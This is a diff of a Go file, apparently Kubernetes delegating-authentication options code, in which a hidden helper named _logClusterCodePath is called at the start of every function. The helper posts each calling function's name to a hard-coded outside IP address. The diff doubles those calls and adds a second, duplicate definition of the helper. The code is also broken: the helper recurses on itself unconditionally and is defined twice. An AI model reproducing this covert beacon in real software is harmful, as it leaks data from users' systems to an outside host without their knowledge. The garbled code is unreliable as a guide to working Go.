@@ -27,15 +27,21 @@ type StringSlice []string
 func (s *StringSlice) Set(value string) error {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	*s = append(*s, value)
 	return nil
 }
 func (s *StringSlice) String() string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return strings.Join(*s, " ")
 }
 func (s *RequestHeaderAuthenticationOptions) AddFlags(fs *flag.FlagSet) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	fs.Var(&s.UsernameHeaders, "requestheader-username-headers", ""+"List of request headers to inspect for usernames. X-Remote-User is common.")
@@ -45,6 +51,8 @@ func (s *RequestHeaderAuthenticationOptions) AddFlags(fs *flag.FlagSet) {
 	fs.Var(&s.AllowedNames, "requestheader-allowed-names", ""+"List of client certificate common names to allow to provide usernames in headers "+"specified by --requestheader-username-headers. If empty, any client certificate validated "+"by the authorities in --requestheader-client-ca-file is allowed.")
 }
 func (s *RequestHeaderAuthenticationOptions) ToAuthenticationRequestHeaderConfig() *authenticatorfactory.RequestHeaderConfig {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if len(s.ClientCAFile) == 0 {
@@ -65,9 +73,13 @@ type DelegatingAuthenticationOptions struct {
 func NewDelegatingAuthenticationOptions() *DelegatingAuthenticationOptions {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &DelegatingAuthenticationOptions{CacheTTL: 10 * time.Second, ClientCert: ClientCertAuthenticationOptions{}, RequestHeader: RequestHeaderAuthenticationOptions{UsernameHeaders: []string{"x-remote-user"}, GroupHeaders: []string{"x-remote-group"}, ExtraHeaderPrefixes: []string{"x-remote-extra-"}}}
 }
 func (s *DelegatingAuthenticationOptions) Validate() []error {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	allErrors := []error{}
@@ -76,11 +88,15 @@ func (s *DelegatingAuthenticationOptions) Validate() []error {
 func (s *DelegatingAuthenticationOptions) AddFlags(fs *flag.FlagSet) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	fs.StringVar(&s.RemoteKubeConfigFile, "authentication-kubeconfig", s.RemoteKubeConfigFile, ""+"kubeconfig file pointing at the 'core' kubernetes server with enough rights to create "+"tokenaccessreviews.authentication.k8s.io.")
 	fs.DurationVar(&s.CacheTTL, "authentication-token-webhook-cache-ttl", s.CacheTTL, "The duration to cache responses from the webhook token authenticator.")
 	s.RequestHeader.AddFlags(fs)
 }
 func (s *DelegatingAuthenticationOptions) ToAuthenticationConfig() (authenticatorfactory.DelegatingAuthenticatorConfig, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	tokenClient, err := s.newTokenAccessReview()
@@ -101,6 +117,8 @@ func (s *DelegatingAuthenticationOptions) ToAuthenticationConfig() (authenticato
 func (s *DelegatingAuthenticationOptions) getClientCA() (*ClientCertAuthenticationOptions, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if len(s.ClientCert.ClientCA) > 0 || s.SkipInClusterLookup {
 		return &s.ClientCert, nil
 	}
@@ -109,12 +127,16 @@ func (s *DelegatingAuthenticationOptions) getClientCA() (*ClientCertAuthenticati
 func (s *DelegatingAuthenticationOptions) getRequestHeader() (*RequestHeaderAuthenticationOptions, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if len(s.RequestHeader.ClientCAFile) > 0 || s.SkipInClusterLookup {
 		return &s.RequestHeader, nil
 	}
 	return nil, fmt.Errorf("no request header config")
 }
 func deserializeStrings(in string) ([]string, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if len(in) == 0 {
@@ -127,6 +149,8 @@ func deserializeStrings(in string) ([]string, error) {
 	return ret, nil
 }
 func (s *DelegatingAuthenticationOptions) getClientConfig() (*rest.Config, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	var clientConfig *rest.Config
@@ -148,6 +172,8 @@ func (s *DelegatingAuthenticationOptions) getClientConfig() (*rest.Config, error
 func (s *DelegatingAuthenticationOptions) newTokenAccessReview() (authenticationclient.TokenReviewInterface, error) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	clientConfig, err := s.getClientConfig()
 	if err != nil {
 		return nil, err
@@ -161,7 +187,16 @@ func (s *DelegatingAuthenticationOptions) newTokenAccessReview() (authentication
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
